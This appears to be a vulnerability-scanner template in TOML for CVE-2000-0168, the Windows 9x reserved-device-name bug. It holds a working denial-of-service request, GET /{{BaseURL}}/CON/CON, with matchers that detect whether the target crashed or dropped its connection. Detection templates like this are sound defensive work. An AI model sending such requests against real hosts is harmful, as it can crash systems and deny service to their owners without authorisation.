[info]
author = "AVE"
description = "向 Windows 9x 系统发送包含保留设备名称（如 CON、NUL）的 HTTP 请求，触发系统崩溃导致拒绝服务。"
id = "POC-AVE-2000-0148"
name = "Microsoft Windows 设备名路径拒绝服务漏洞 PoC"
severity = "medium"
tags = [
    "cve-2000-0168",
    "dos",
    "windows",
    "device-name",
]
vuln_id = [
    "CVE-2000-0168",
    "AVE-2000-0148",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/CON/CON"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Connection reset by peer",
    "connection refused",
    "no route to host",
]
